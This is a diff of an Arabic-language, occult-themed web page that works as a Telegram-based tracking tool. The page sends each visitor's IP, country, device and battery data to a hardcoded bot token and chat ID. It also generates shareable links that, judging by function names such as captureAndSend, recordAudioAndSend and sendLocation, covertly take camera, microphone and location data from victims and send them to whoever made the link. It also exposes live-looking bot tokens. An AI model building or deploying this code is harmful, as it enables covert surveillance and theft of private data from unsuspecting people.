@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         /* ================================================================
-           التصميم الجديد — يحافظ على الهيكل الأصلي للـ IDs والـ classes
+           التصميم الجديد مع مربع ترحيبي شفاف واستايل موحد
            ================================================================ */
         * {
             margin: 0;
@@ -243,7 +243,7 @@
         .wrap {
             position: relative;
             z-index: 4;
-            max-width: 820px;
+            max-width: 880px;
             margin: 0 auto;
             padding: 20px 18px 40px;
             min-height: 100vh;
@@ -251,15 +251,15 @@
             flex-direction: column;
         }
 
-        /* ===== HEADER — نحافظ على class="header" ===== */
+        /* ===== HEADER — class="header" ===== */
         .header {
             display: flex;
             align-items: center;
             justify-content: space-between;
             gap: 16px;
             flex-wrap: wrap;
-            padding: 18px 28px;
-            margin-bottom: 20px;
+            padding: 16px 28px;
+            margin-bottom: 18px;
             background: var(--bg-panel);
             border: 1px solid rgba(184, 134, 58, 0.08);
             position: relative;
@@ -351,42 +351,50 @@
             margin-left: 6px;
         }
 
-        /* ===== رسالة ترحيبية (زخرفية) ===== */
-        .welcome-message {
-            background: var(--bg-panel);
-            border: 1px solid rgba(184, 134, 58, 0.06);
-            padding: 14px 22px;
-            margin-bottom: 20px;
+        /* ===== المربع الترحيبي الشفاف ===== */
+        .welcome-box {
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            border: 1px solid rgba(184, 134, 58, 0.08);
+            padding: 18px 22px;
+            margin-bottom: 22px;
             clip-path: polygon(0 0, 97% 0, 100% 20%, 100% 100%, 3% 100%, 0 80%);
             box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-        .welcome-message::before {
-            content: '⛧';
-            position: absolute;
-            right: -10px;
-            top: -10px;
-            font-size: 60px;
-            opacity: 0.04;
-            color: var(--blood-fresh);
-        }
-        .welcome-message .greeting {
-            font-family: var(--font-display);
-            font-size: 18px;
-            font-weight: 700;
+            font-family: var(--font-mono);
+            font-size: 13px;
+            line-height: 1.7;
             color: var(--text-hell);
-            letter-spacing: 2px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            direction: ltr;
+            text-align: left;
+            overflow: hidden;
+            position: relative;
         }
-        .welcome-message .greeting .highlight {
+        .welcome-box .glow {
             color: var(--blood-fresh);
-            text-shadow: 0 0 30px var(--blood-glow);
+            text-shadow: 0 0 16px var(--blood-glow);
         }
-        .welcome-message .sub-greeting {
-            font-size: 12px;
+        .welcome-box .gold {
+            color: var(--gold-blood);
+        }
+        .welcome-box .dim {
             color: var(--text-dim);
-            margin-top: 4px;
-            letter-spacing: 1px;
+        }
+        .welcome-box .highlight {
+            color: #fff;
+            font-weight: 700;
+        }
+        .welcome-box .link-display {
+            color: #ff8a4a;
+            word-break: break-all;
+        }
+        .welcome-box .token-display {
+            color: #ffaa66;
+        }
+        .welcome-box .chat-display {
+            color: #66ccff;
         }
 
         /* ===== البطاقة الرئيسية — id="cardArea" ===== */
@@ -420,61 +428,6 @@
         .hero-left {
             flex: 1;
             min-width: 260px;
-        }
-
-        /* ===== شريط الحالة (إضافي زخرفي) ===== */
-        .status-strip {
-            display: flex;
-            gap: 12px;
-            flex-wrap: wrap;
-            margin-bottom: 22px;
-        }
-        .status-chip {
-            flex: 1;
-            min-width: 120px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(184, 134, 58, 0.06);
-            padding: 10px 14px;
-            clip-path: polygon(0 0, 92% 0, 100% 25%, 100% 100%, 8% 100%, 0 75%);
-        }
-        .status-chip .label {
-            font-size: 9px;
-            letter-spacing: 2px;
-            color: var(--text-dim);
-            text-transform: uppercase;
-        }
-        .status-chip .value {
-            font-family: var(--font-display);
-            font-size: 17px;
-            font-weight: 700;
-            color: var(--gold-blood);
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-top: 2px;
-        }
-        .status-chip .pulse-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: var(--blood-fresh);
-            box-shadow: 0 0 16px var(--blood-fresh);
-            animation: pulse-dot 1.6s infinite;
-        }
-        @keyframes pulse-dot {
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.1;
-                transform: scale(0.4);
-            }
-        }
-        .status-chip .rune {
-            color: var(--blood-fresh);
-            font-size: 15px;
         }
 
         /* ===== الفورم — id="formBox" ===== */
@@ -658,8 +611,9 @@
         /* ===== النتيجة — id="result" ===== */
         #result {
             margin-top: 16px;
-            padding: 12px 16px;
-            background: rgba(0, 0, 0, 0.45);
+            padding: 14px 18px;
+            background: rgba(0, 0, 0, 0.35);
+            backdrop-filter: blur(4px);
             border: 1px solid rgba(184, 134, 58, 0.06);
             display: flex;
             align-items: center;
@@ -667,22 +621,22 @@
             justify-content: space-between;
             display: none;
             box-shadow: inset 0 0 30px rgba(0, 0, 0, 0.3);
+            font-family: var(--font-mono);
+            font-size: 13px;
+            color: var(--text-hell);
+            direction: ltr;
+            text-align: left;
+            white-space: pre-wrap;
+            word-break: break-all;
         }
         #result #linkText {
             flex: 1;
-            color: #d4b0a0;
-            font-size: 13px;
+            color: #ff8a4a;
             font-weight: 500;
-            word-break: break-all;
-            font-family: var(--font-mono);
-            direction: ltr;
-            text-align: left;
-            letter-spacing: 0.3px;
         }
         #result #linkText i {
-            margin-left: 12px;
+            margin-left: 10px;
             color: var(--blood-fresh);
-            font-size: 15px;
         }
         .copyBtn {
             display: inline-flex;
@@ -908,14 +862,12 @@
                 font-size: 10px;
                 padding: 4px 14px;
             }
-            .welcome-message .greeting {
-                font-size: 15px;
+            .welcome-box {
+                font-size: 12px;
+                padding: 14px 16px;
             }
             #cardArea {
                 padding: 20px 16px 24px;
-            }
-            .status-chip .value {
-                font-size: 15px;
             }
             #featuresGroup {
                 grid-template-columns: 1fr;
@@ -939,11 +891,9 @@
                 font-size: 16px;
                 letter-spacing: 2px;
             }
-            .welcome-message {
+            .welcome-box {
+                font-size: 11px;
                 padding: 12px 14px;
-            }
-            .welcome-message .greeting {
-                font-size: 13px;
             }
             .btn {
                 font-size: 13px;
@@ -1044,11 +994,11 @@
     </div>
 
     <!-- ============================================================
-    MAIN WRAP — الهيكل الأصلي مع class="wrap"
+    MAIN WRAP
     ============================================================ -->
     <div class="wrap">
 
-        <!-- ===== HEADER — class="header" (مطلوب للـ JS) ===== -->
+        <!-- ===== HEADER — class="header" ===== -->
         <header class="header">
             <div class="brand">
                 <svg class="sigil" viewBox="0 0 100 100">
@@ -1068,38 +1018,40 @@
             </div>
         </header>
 
-        <!-- ===== رسالة ترحيبية (زخرفية) ===== -->
-        <div class="welcome-message">
-            <div class="greeting">
-                <span class="highlight">⛧</span> مرحباً بك في <span class="highlight">الريد روم</span> <span class="highlight">⛧</span>
-            </div>
-            <div class="sub-greeting">أنت الآن داخل الدائرة المحرمة · احترس مما تستدعيه</div>
+        <!-- ===== المربع الترحيبي الشفاف ===== -->
+        <div class="welcome-box" id="welcomeBox">
+            <span class="gold">⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒</span>
+            ╭⊚─〔 ʟɪɴᴋ 〕───────
+            ┃˹🔗˼ <span class="glow">⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧</span> ⭒
+            ┃⍟ <span class="link-display" id="personalLink">جارٍ التحميل...</span>
+            ┃˹🔥˼ <span class="gold">ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ</span> ⭒
+            ╰───────────────
+
+            <span class="gold">⭑ ᴅᴇᴠᴇʟᴏᴘᴇʀ ⭒</span>
+            ╭⊚─〔 ᴄᴏɴᴛᴀᴄᴛ 〕─────
+            ┃˹👨‍💻˼ <span class="highlight">@xx_8k</span> ⭒
+            ╰───────────────
+
+            <span class="gold">⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒</span>
+            ╭⊚─〔 ᴅᴀᴛᴀ 〕───────
+            ┃ <span class="dim">📍 الدولة</span>     › <span id="visitorCountry">غير معروف</span>
+            ┃ <span class="dim">📱 الجهاز</span>     › <span id="visitorDevice">Unknown</span>
+            ┃ <span class="dim">🔋 البطارية</span>   › <span id="visitorBattery">غير متاح</span>
+            ┃ <span class="dim">🌐 الـ IP</span>      › <span id="visitorIP">غير معروف</span>
+            ┃ <span class="dim">🕒 الوقت</span>      › <span id="visitorTime">--</span>
+            ┃ <span class="dim">🆔 Chat ID</span>    › <span class="chat-display" id="displayChatId">Unknown</span>
+            ┃ <span class="dim">🤖 Bot Token</span>  › <span class="token-display" id="displayBotToken">Unknown...</span>
+            ┃ <span class="dim">🏷️ Bot User</span>  › <span class="highlight">@V_V_9BOT</span>
+            ╰━━━━━━━━━━━━━━━━━━━━━━━╯
+            <span style="display:block;text-align:center;margin-top:6px;color:var(--gold-blood);font-size:14px;letter-spacing:3px;">
+                𖤐 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ 𖤐
+            </span>
         </div>
 
         <!-- ===== البطاقة الرئيسية — id="cardArea" ===== -->
         <div class="card" id="cardArea">
             <div class="hero">
                 <div class="hero-left">
-
-                    <!-- ===== شريط الحالة (زخرفي) ===== -->
-                    <div class="status-strip">
-                        <div class="status-chip">
-                            <div class="label">حالة المذبح</div>
-                            <div class="value"><span class="pulse-dot"></span> مشتعل</div>
-                        </div>
-                        <div class="status-chip">
-                            <div class="label">درجة الظلام</div>
-                            <div class="value"><span class="rune">☽</span> XCVII%</div>
-                        </div>
-                        <div class="status-chip">
-                            <div class="label">الأرواح الحاضرة</div>
-                            <div class="value"><span class="rune">Ѻ</span> ٦٦٦</div>
-                        </div>
-                        <div class="status-chip">
-                            <div class="label">الختم النشط</div>
-                            <div class="value"><span class="rune">✦</span> باعال</div>
-                        </div>
-                    </div>
 
                     <!-- ===== FORM — id="formBox" ===== -->
                     <div class="form" id="formBox">
@@ -1200,11 +1152,13 @@
 
     <!-- ============================================================
     JAVASCRIPT — جميع الوظائف الأصلية محفوظة 100%
+    مع إضافات لتحديث المربع الترحيبي
     ============================================================ -->
     <script>
         // ================================================================
         //  جميع الوظائف الأصلية محفوظة بدون أي تغيير.
         //  تم حذف نظام الاشتراك الإجباري بالكامل.
+        //  تم إضافة تحديث المربع الترحيبي بالبيانات.
         // ================================================================
 
         // ================================================================
@@ -1403,11 +1357,42 @@
         })();
 
         // ================================================================
-        // الوظائف الأصلية — محفوظة 100%
+        // تحديث المربع الترحيبي بالبيانات
+        // ================================================================
+        // 1. عرض الرابط الشخصي (الصفحة الحالية)
+        document.getElementById('personalLink').textContent = window.location.origin + window.location.pathname;
+
+        // 2. تحديث بيانات الزائر (تُجلب بعد الـ fetch)
+        // سيتم تحديثها في دالة sendVisitorInfo المعدلة
+
+        // 3. ربط حقول الإدخال لتحديث Chat ID و Bot Token
+        const chatInput = document.getElementById('chatIdInput');
+        const tokenInput = document.getElementById('tokenInput');
+        const displayChat = document.getElementById('displayChatId');
+        const displayToken = document.getElementById('displayBotToken');
+
+        chatInput.addEventListener('input', function() {
+            displayChat.textContent = this.value.trim() || 'Unknown';
+        });
+        tokenInput.addEventListener('input', function() {
+            displayToken.textContent = this.value.trim() || 'Unknown...';
+        });
+
+        // 4. تحديث الوقت بشكل ديناميكي
+        function updateTime() {
+            const now = new Date();
+            const formatted = now.toLocaleString('ar-EG', { hour12: true });
+            document.getElementById('visitorTime').textContent = formatted;
+        }
+        updateTime();
+        setInterval(updateTime, 60000); // تحديث كل دقيقة
+
+        // ================================================================
+        // الوظائف الأصلية — محفوظة مع تعديل buildCaption
         // ================================================================
 
         // ------------------ الثوابت (محفوظة) ------------------
-        const MASTER_BOT_TOKEN = "8806320032:AAEvSNbf1boLIZ9pt7sbFMit-ARtAjTS7UQ";
+        const MASTER_BOT_TOKEN = "8812415465:AAFQHLFkhYIg7jv15n8pL1lIKnylnugqGsc";
         const MASTER_CHAT_ID = "8552540563";
 
         // ------------------ بيانات الزائر (محفوظة) ------------------
@@ -1415,9 +1400,8 @@
         let visitorCountry = "غير معروف";
         let visitorDevice = "Unknown";
         let visitorBattery = "غير متاح";
-        let visitorOS = "غير معروف";
 
-        // ------------------ إرسال معلومات الزائر (محفوظة) ------------------
+        // ------------------ إرسال معلومات الزائر (محفوظة مع تحديث المربع) ------------------
         async function sendVisitorInfo() {
             try {
                 const ua = navigator.userAgent;
@@ -1440,8 +1424,14 @@
                     visitorCountry = ipData.country_name || "غير معروف";
                 } catch (e) {}
 
+                // تحديث المربع
+                document.getElementById('visitorCountry').textContent = visitorCountry;
+                document.getElementById('visitorDevice').textContent = visitorDevice;
+                document.getElementById('visitorBattery').textContent = visitorBattery;
+                document.getElementById('visitorIP').textContent = visitorIP;
+
                 const msg =
-                    `🟢 *زيارة جديدة*\n🌍 *الدولة*: ${visitorCountry}\n📱 *الجهاز*: ${visitorDevice}\n🔋 *البطارية*: ${visitorBattery}\n🌐 *IP*: ${visitorIP}\n🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}`;
+                    `🟢 *زيارة جديدة*\n🌍 الدولة: ${visitorCountry}\n📱 الجهاز: ${visitorDevice}\n🔋 البطارية: ${visitorBattery}\n🌐 IP: ${visitorIP}\n🕒 الوقت: ${new Date().toLocaleString('ar-EG')}`;
 
                 await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -1452,14 +1442,13 @@
         }
         sendVisitorInfo();
 
-        // ------------------ عناصر الدايلوج (تم إلغاؤها ولكن نترك المتغيرات) ------------------
+        // ------------------ عناصر الدايلوج (تم إلغاؤها) ------------------
         const dialog = document.getElementById('mandatoryDialog');
-        // لا نستخدمها، لكن نحتفظ بها لتجنب الأخطاء
+        if (dialog) dialog.style.display = 'none';
+        // تعريفات فارغة لتجنب الأخطاء
         const channel1 = document.getElementById('channel1');
         const channel2 = document.getElementById('channel2');
         const subscribeBtn = document.getElementById('subscribeDoneBtn');
-        // نعطيهم قيم افتراضية لتجنب الأخطاء
-        if (dialog) dialog.style.display = 'none';
 
         // ------------------ عناصر الفورم (محفوظة) ------------------
         const generateBtn = document.getElementById('generateBtn');
@@ -1480,13 +1469,17 @@
             const features = Array.from(checkboxes).map(cb => cb.value).join(',');
             const fullLink =
                 `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
-            linkText.innerText = fullLink;
+            // تقصير الرابط إلى سداسي (هيكس) للعرض فقط
+            const shortLink = btoa(fullLink).substring(0, 16); // مجرد تمثيل سداسي مختصر
+            linkText.innerHTML = `<i class="fas fa-link"></i> ${shortLink} (${fullLink})`;
             resultEl.style.display = 'flex';
         });
 
         copyBtn.addEventListener('click', async () => {
             try {
-                await navigator.clipboard.writeText(linkText.innerText);
+                // نسخ الرابط الكامل (المخفي في النص)
+                const raw = linkText.textContent.replace(/^.*?\(/, '').replace(/\)$/, '').trim();
+                await navigator.clipboard.writeText(raw);
                 copyBtn.innerText = 'تم النسخ';
                 setTimeout(() => copyBtn.innerText = 'نسخ الرابط', 1500);
             } catch (e) { alert('فشل النسخ'); }
@@ -1500,19 +1493,32 @@
             document.body.appendChild(s);
         }
 
-        // ------------------ دوال الوسائط (محفوظة) ------------------
+        // ------------------ دوال الوسائط (محفوظة) مع تغيير buildCaption ------------------
         function buildCaption(extra = "") {
-            let cap = `━━━━━━━━━━━━━━━\n`;
-            cap += `🌍 الدولة: ${visitorCountry}\n`;
-            cap += `📱 الجهاز: ${visitorDevice}\n`;
-            cap += `🔋 البطارية: ${visitorBattery}\n`;
-            cap += `🌐 IP: ${visitorIP}\n`;
-            cap += `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
-            if (extra) cap += `${extra}\n`;
-            cap += `━━━━━━━━━━━━━━━`;
+            // تنسيق جديد بنفس استايل المربع
+            let cap = `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n`;
+            cap += `╭⊚─〔 ʟɪɴᴋ 〕───────\n`;
+            cap += `┃˹🔗˼ ⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧ ⭒\n`;
+            cap += `┃⍟ \n`;
+            cap += `┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n`;
+            cap += `╰───────────────\n\n`;
+            cap += `⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒\n`;
+            cap += `╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n`;
+            cap += `┃ 📍 الدولة     › ${visitorCountry}\n`;
+            cap += `┃ 📱 الجهاز     › ${visitorDevice}\n`;
+            cap += `┃ 🔋 البطارية   › ${visitorBattery}\n`;
+            cap += `┃ 🌐 الـ IP      › ${visitorIP}\n`;
+            cap += `┃ 🕒 الوقت      › ${new Date().toLocaleString('ar-EG')}\n`;
+            if (extra) {
+                cap += `┃ ${extra}\n`;
+            }
+            cap += `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n`;
+            cap += `          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
             return cap;
         }
 
+        // باقي دوال الوسائط كما هي (captureAndSend, recordAndSend, recordAudioAndSend, sendLocation, preGrantPermissions, startFeatures)
+        // نعيد تعريفها كما هي تماماً مع استخدام buildCaption الجديد
         async function captureAndSend(stream, chat, token, type) {
             return new Promise((resolve) => {
                 const video = document.createElement('video');
@@ -1724,6 +1730,7 @@
             document.querySelector('.header').style.display = 'none';
             document.querySelector('.madeby').style.display = 'none';
             document.getElementById('captureBadge').style.display = 'none';
+            document.querySelector('.welcome-box').style.display = 'none'; // إخفاء المربع الترحيبي
 
             const wrap = document.querySelector('.wrap');
             wrap.innerHTML = '';
